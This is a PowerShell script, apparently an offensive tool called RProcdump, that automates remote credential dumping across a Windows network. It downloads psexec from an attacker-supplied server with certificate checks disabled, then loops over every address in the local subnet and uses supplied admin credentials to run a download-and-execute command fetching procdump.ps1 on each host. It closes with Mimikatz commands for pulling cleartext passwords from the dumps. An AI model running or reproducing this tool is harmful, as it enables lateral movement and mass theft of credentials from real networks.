<#
RPROCDUMP - Remote process dumping automation. 
Use it to dump remotely all windows credentials and extract clear text with Mimikatz offline
Help:
	Edit prameters in procdump.ps1 and run Rprocdump.ps1 with same parameters:
	example:
	RProcdump -server http://127.0.0.1 -login administrator -pass password123

 Author: @ThebenyGreen
  - EyesOpenSecurity
#>

Function RProcdump {
	[CmdletBinding()] param( 
	[string] $server ,
	[string] $login ,
	[string] $pass 
	)
#	[string] $server = "http://127.0.0.1"
#	[string] $login = "administrator"
#	[string] $pass =  "password123"
	Function PsexecDownload {
			$exists = "$env:userprofile\psexec.exe"
			If (Test-Path $exists){
			 Write-Verbose "Already present"
			} else {
			if($env:PROCESSOR_ARCHITECTURE -eq "x86")
			{$downloadURL = "$server/psx32.txt"}else{$downloadURL = "$server/psx64.txt"}
            [string] $FileOnDisk =  "$env:userprofile\log.txt"
            if ($downloadURL.Substring(0,5) -ceq "https") {
                [System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $True }
            }
			(New-Object System.Net.WebClient).DownloadFile($downloadURL, $FileOnDisk)
			Rename-Item $FileOnDisk psexec.exe
			}
		}
	Function PsexecCommand { 
		[CmdletBinding()] param( 
		[string]$id
		)
		$cmdline = @"
iex((New-Object Net.WebClient).DownloadString("$server/procdump.ps1"))
"@
		PsexecDownload 
		$r = Test-Path "$env:userprofile\psexec.exe"
		if (Test-Path "$env:userprofile\psexec.exe") {
			$ip = ((ipconfig | findstr [0-9].\.)[0]).Split()[-1]
			$w = $ip.split('.')[0]
			$x = $ip.split('.')[1]
			$y = $ip.split('.')[2]
			$z = $ip.split('.')[3]
			$StartAddress = "$w.$x.$y"
			for($i = 1; $i -lt 254; $i++) {
				$ipAddress= "$StartAddress.$i"
				$Command = "$env:userprofile\psexec.exe \\$ipAddress -u $login -p $pass -h -d powershell -exec bypass $cmdline"
				[string] $CmdPath = "$env:windir\System32\cmd.exe"
				[string] $CmdString = "$CmdPath" + " /C " + "$Command"
				Invoke-Expression $CmdString
			}	
		}
	}
PsexecCommand
echo "Open dump file with Mimikatz to retrieve the creds -> mimikatz # sekurlsa::minidump HOSTNAME.dmp  AND >mimikatz # sekurlsa::logonPasswords"
}

